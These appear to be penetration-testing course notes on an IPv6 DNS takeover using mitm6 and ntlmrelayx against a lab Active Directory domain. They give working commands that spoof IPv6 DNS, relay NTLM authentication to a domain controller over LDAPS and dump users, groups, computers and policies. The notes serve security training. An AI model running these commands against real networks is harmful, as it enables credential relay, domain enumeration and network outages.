## IPv6 DNS Takeover via MITM6

IPv6 generally enabled but not used on most devices

=> no DNS Service running for that

### Attack

- Simulate a DNS Server for IPv6
- listen for all msgs that come through
- Capture all the data

-> Authentication to Domain Controller (DC) via LDAP or SMB

### Execution

#### Run MITM6

```bash
sudo mitm6 -d MARVEL.local
```
-d = Domain

#### Setup NTLM relay

```bash
ntlmrelayx.py -6 -t ldaps://192.168.70.141 -wh fakewpad.marvel.local -l lootme
```
-6 = IPv6
-t = target (ldaps://targetIP)
-wh = setting up fakeWpad
-l = loot (follow with folder)


### Output

All the found and sorted data can be found in the set folder(e.g. lootme)

Captures:
- Users
- Groups
- Computers
- Policies

### Important

- can cause network outages (run for 5-10 minutes max)